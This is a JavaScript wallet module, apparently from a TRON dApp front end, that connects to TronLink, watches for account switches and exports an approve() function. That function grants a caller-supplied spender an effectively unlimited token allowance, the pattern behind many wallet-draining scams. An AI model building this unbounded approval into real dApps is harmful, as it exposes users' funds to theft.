import { useUserStore } from '@/store/user'
import { contractAddress } from './config'

let _tronWeb = null
export const check = async () => {
  return new Promise((resolve, reject) => {
    // console.log(window, 'window')
    if (window.tronWeb || window.tronLink) {
      resolve(true)
    } else {
      window.addEventListener(
        'tronWeb#initialized',
        function () {
          resolve(true)
        },
        {
          once: true
        }
      )
      // 等待10ms
      setTimeout(function () {
        resolve(false)
      }, 10)
    }
  })
}

/**
 * 获取默认地址
 */
const getDefaultAddress = (_tronWeb) => {
  return _tronWeb?.defaultAddress?.base58 || _tronWeb?.tronWeb?.defaultAddress?.base58 || ''
}

/**
 * 请求连接钱包
 */


export const connect = async () => {
  let result = { code: 200 }
  let isChecked = await check()
  console.log(1212000, '00000000000')

  if (isChecked) {
    try {
      _tronWeb = window.tronlink || window.tronLink || window.tronWeb
      let tronAccounts = null
      try {
        tronAccounts = await _tronWeb.request({
          method: 'tron_requestAccounts'
        })
      } catch (error) {
        try {
          tronAccounts = await _tronWeb.tron.getAccounts()
        } catch (error) {
          tronAccounts = []
        }
      }
      console.log('tronAccounts', tronAccounts)
      let defaultAddress = getDefaultAddress(_tronWeb)

      if (tronAccounts[0] || defaultAddress) {
        result.data = {
          type: 'TRON',
          address: tronAccounts[0] || defaultAddress
        }
      } else {
        result.code = 500
        // result.msg = tronAccounts.message || '请安装 TronLink 扩展插件并登录后继续操作。'
        result.msg =
          tronAccounts.message || 'Please install the TronLink extension and log in to continue.'
      }
    } catch (error) {
      console.log('121212m12m12n1n2');
      
      result.code = 500
      result.msg = error.message
    }
  } else {
    result.code = 500
    // result.msg = '请安装 TronLink 扩展插件并登录后继续操作。'
    result.msg = 'Please install the TronLink extension and log in to continue.'
  }
  return result
}

/**
 * 初始化钱包切换监听
 */
export const initSwitchWalletEvent = async () => {
  let checked = await check()
  if (checked) {
    const userStore = useUserStore()
    window.addEventListener('message', async function (e) {
      if (e.data.message && e.data.message.action == 'accountsChanged') {
        console.log('地址切换为', e.data.message.data.address)
        userStore.signOut()
        setTimeout(() => location.reload(), 10)
      }
    })
  }
}

/**
 * 授权
 * @param {string} spenderAddress - 授权地址
 */
export const approve = async (spenderAddress) => {
  try {
    await connect()
    const tronLink = _tronWeb.tronWeb || _tronWeb
    const contract = await tronLink.contract().at(contractAddress)
    return await contract.methods.approve(spenderAddress, '999000000000000000').send()
  } catch (err) {
    console.log(err)
    return Promise.reject(err)
  }
}
